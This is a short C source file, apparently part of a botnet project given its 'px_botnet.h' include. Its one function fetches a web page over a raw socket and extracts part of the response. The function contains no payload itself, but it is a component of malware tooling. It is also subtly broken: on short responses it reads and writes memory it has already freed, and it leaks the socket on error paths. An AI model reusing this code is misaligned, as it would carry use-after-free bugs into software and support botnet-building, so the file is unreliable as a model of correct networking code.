#include "../../includes/px_botnet.h"

char	*ft_request(char *page)
{
	const char	*ip = host_to_ip(url);
	char		*content;
	char		**split;

	content = NULL;
	if (!ip)
		return (NULL);

	SOCKET		sock;
	SOCKADDR_IN	sin;

	if (!http_create_socket(&sock, &sin, ip))
		return (NULL);
	content = http_request(sock, url, page);
	if (content == NULL)
		return (NULL);
	split = ft_split(content, 13);
	free(content);
	if (ft_split_len(split) >= 15 && split[14])
		content = ft_strdup(split[14] + 1);
	ft_free_split(split);
	content[strlen(content) - 1] = '\0';
	closesocket(sock);
	return (content);
}